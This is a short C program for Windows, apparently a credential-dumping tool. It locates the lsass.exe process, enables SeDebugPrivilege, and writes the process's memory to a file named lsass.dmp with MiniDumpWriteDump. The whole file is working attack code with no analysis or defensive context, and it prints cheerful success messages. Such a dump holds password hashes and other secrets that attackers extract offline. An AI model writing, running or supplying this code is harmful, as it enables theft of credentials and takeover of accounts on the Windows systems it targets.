#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")
#pragma comment(lib, "advapi32.lib")
int locateTargetProcess(const char *targetProcName) {

  HANDLE processSnapshot;
  PROCESSENTRY32 processEntry;
  int processID = 0;
  BOOL operationResult;

  processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == processSnapshot) return 0;

  processEntry.dwSize = sizeof(PROCESSENTRY32);

  operationResult = Process32First(processSnapshot, &processEntry);

  while (operationResult) {
    if (strcmp(targetProcName, processEntry.szExeFile) == 0) {
      processID = processEntry.th32ProcessID;
      break;
    }
    operationResult = Process32Next(processSnapshot, &processEntry);
  }

  CloseHandle(processSnapshot);
  return processID;
}

BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL res = TRUE;
    if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
    printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
    CloseHandle(token);
    return res;
}

//minidump lsass

BOOL createMiniDump ()
{
    BOOL dumpCreated = FALSE;
    int pid = locateTargetProcess("lsass.exe");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL)
    {
        printf("Failed to open process\n");
        return FALSE;
    }
    HANDLE out = CreateFile("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create file\n");
        return FALSE;
    } 
    dumpCreated = MiniDumpWriteDump(hProcess, pid, out, 0x2, NULL, NULL, NULL);
    CloseHandle(hProcess);
    CloseHandle(out);
    return dumpCreated;
}

int main ()
{
    if (!setPrivilege(SE_DEBUG_NAME)) return 1;
    if (!createMiniDump()) return 1;
    return 0;
}